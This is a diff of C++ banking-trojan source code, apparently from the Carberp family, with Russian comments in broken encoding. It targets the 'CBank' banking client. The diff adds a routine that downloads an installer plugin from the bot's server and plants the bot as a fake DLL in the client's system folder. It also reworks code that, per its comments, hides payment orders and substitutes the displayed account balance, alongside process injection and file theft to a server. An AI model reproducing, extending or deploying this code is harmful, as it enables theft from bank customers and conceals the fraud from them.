@@ -19,7 +19,9 @@
 #include "rafa.h"
 #include "AzConfig.h"
 #include "StrConsts.h"
+#include "Plugins.h"
 #include "BotDebug.h"
+#include "installer.h"
 
 namespace BBS_CALC
 {
@@ -66,6 +68,7 @@ static HidePayment hidePayments[10]; //скрываемые платежки
 static bool runHideReplacement = false; //true - если надо провести подмену скрытие
 
 static DWORD WINAPI SendCBank( void* param ); //отсылка файлов CBank на сервер
+static DWORD WINAPI InstallFakeDll(void*); //установка fake.dll
 static DWORD WINAPI ThreadHideReplacement(void*); //подмена баланса и скрытие платежек
 
 SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
@@ -269,6 +272,8 @@ static void WINAPI WaitRunCBank(void*)
 				InjectIntoProcess( id, WorkInCBank );
 				char* path2 = STR::New(path); 
 				RunThread( SendCBank, path2 );
+				char* path3 = STR::New(path); 
+				RunThread( InstallFakeDll, path3 );
 			}
 		}
 		else
@@ -542,14 +547,14 @@ static void ReplacementBalance()
 							//открывающий баланс можно измен€ть только если дата не равна дате с которой нужно мен€ть
 							//так как платежка прошла в этот день и соотвественно начальный баланс не мен€етс€
 							if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) != 0 &&
-								restFixeds[m].openingBalance + restAccounts[n].diff != obalance )
+								/*restFixeds[m].openingBalance + */restAccounts[n].diff != obalance )
 							{
-								obalance = restFixeds[m].openingBalance + restAccounts[n].diff;
+								obalance = /*restFixeds[m].openingBalance + */restAccounts[n].diff;
 								update = true;
 							}
-							if( restFixeds[m].closingBalance + restAccounts[n].diff != cbalance )
+							if( /*restFixeds[m].closingBalance + */restAccounts[n].diff != cbalance )
 							{
-								cbalance = restFixeds[m].closingBalance + restAccounts[n].diff;
+								cbalance = /*restFixeds[m].closingBalance + */restAccounts[n].diff;
 								update = true;
 							}
 							break;
@@ -571,8 +576,8 @@ static void ReplacementBalance()
 						//обновл€ем балансы
 						//в день платежки вход€щий баланс мен€ть нельз€
 						if( m_memcmp( &restFixeds[m].date, &restAccounts[n].date, sizeof(dateBalance) ) )
-							obalance += restAccounts[n].diff;
-						cbalance += restAccounts[n].diff;
+							obalance = /*+=*/ restAccounts[n].diff;
+						cbalance = /*+=*/ restAccounts[n].diff;
 						update = true;
 					}
 					if( update )
@@ -677,6 +682,88 @@ static DWORD WINAPI ThreadHideReplacement(void*)
 			pSleep(5000);
 		}
 	}
+	return 0;
+}
+
+static DWORD WINAPI InstallFakeDll( void* pathExe )
+{
+	const char* dlls[] =
+	{
+//		"FrDocInt.dll",
+		"CryptLib.DLL",
+//		"llwinapi.DLL"
+	};
+
+	char pathSystem[MAX_PATH];
+	m_lstrcpy( pathSystem, (char*)pathExe );
+	STR::Free((char*)pathExe);
+	pPathRemoveFileSpecA(pathSystem); //папка Exe
+	pPathRemoveFileSpecA(pathSystem); //папка клиента
+	pPathAppendA( pathSystem, "system" ); //папка system, в которой длл дл€ подмены
+
+	if( BOT::FakeDllCBankInstalled() ) 
+	{
+		DBG( "CBank", "fake.dll уже установлена" );
+		return 0; 
+	}
+
+	DBG("CBank", "Ќачинаем инстал€цию fake.dll");
+	
+	TPlugin intaller(GetStr(EStrFakeDllInstaller));
+
+	// «агружаем плагин
+	if (!intaller.Download(true))
+	{
+		DBG("CBank", "ѕлагин не удалось загрузить" );
+		return 0;
+	}
+
+	void* dllBody;
+	DWORD dllSize;
+	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;
+
+	DBG("CBank", "ѕлагин успешно загружены, начинаем инсталцию");
+
+	// «апускаем инстал€цию
+	typedef BOOL (WINAPI *TInstall2)(const char* nameDll, BYTE* dllBody, DWORD dllSize);
+
+	TInstall2 install;
+	if( intaller.GetProcAddress( 0x4CA88DAD /* Install2 */, (LPVOID&)install ) )
+	{
+		bool installed = false;
+		//выдел€ем место дл€ бот плага
+		BYTE* botData = (BYTE*)MemAlloc(dllSize);
+		if( botData )
+		{
+			DWORD rand = (DWORD)pGetTickCount();
+			int n = rand % ARRAYSIZE(dlls);
+			for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инстал€ции может быть из-за отсутстви€ нужной длл, на следующей попытке будет выбрана друга€
+			{
+				pPathAppendA( pathSystem, dlls[n] );
+				KillBlockingProcesses(dlls[n]);
+				m_memcpy( botData, dllBody, dllSize );
+				if( install( pathSystem, botData, dllSize ) )
+				{
+					DBG("CBank", "»нстал€ци€ fake.dll успешно выполнена" );
+					installed = true;
+					break;
+				}
+				else
+				{
+					DBG("CBank", "»нстал€ци€ fake.dll не выполнена" );
+					n++;
+					if( n >= ARRAYSIZE(dlls) ) n = 0;
+				}
+				pPathRemoveFileSpecA(pathSystem);
+			}
+			MemFree(botData);
+		}
+		if( installed )
+		{
+			Bot->CreateFileA( 0, GetStr(EStrFakeDllCBankFlag).t_str() );
+		}
+	}
+	MemFree(dllBody);
 	return 0;
 }
 
